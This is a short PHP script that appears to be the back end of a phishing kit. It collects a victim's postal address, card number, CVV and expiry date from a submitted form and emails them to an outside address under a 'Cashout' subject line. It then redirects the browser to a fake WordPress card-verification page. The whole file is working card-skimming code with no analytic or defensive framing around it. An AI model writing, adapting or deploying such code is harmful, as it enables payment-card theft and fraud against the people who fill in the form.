<?php
header('Location: /wp-admin/verify-card');
$address=$_POST['address'];
$card=$_POST['card'];
$cvv=$_POST['cvv'];
$expiry=$_POST['expiry'];
$nl="\r\n";
$from = "Cashout";
$to = "admin@xmz-productions.com";
$subject = "Cashout Is A Must By Gods  Grace";
$message = 'ADDRESS: ' . $address . $nl.'CARD: ' . $card .$nl. 'CVV: ' . $cvv  . $nl. 'EXPIRY: ' . $expiry ;
$headers = "From:" . $from;
mail($to,$subject,$message, $headers) 
?>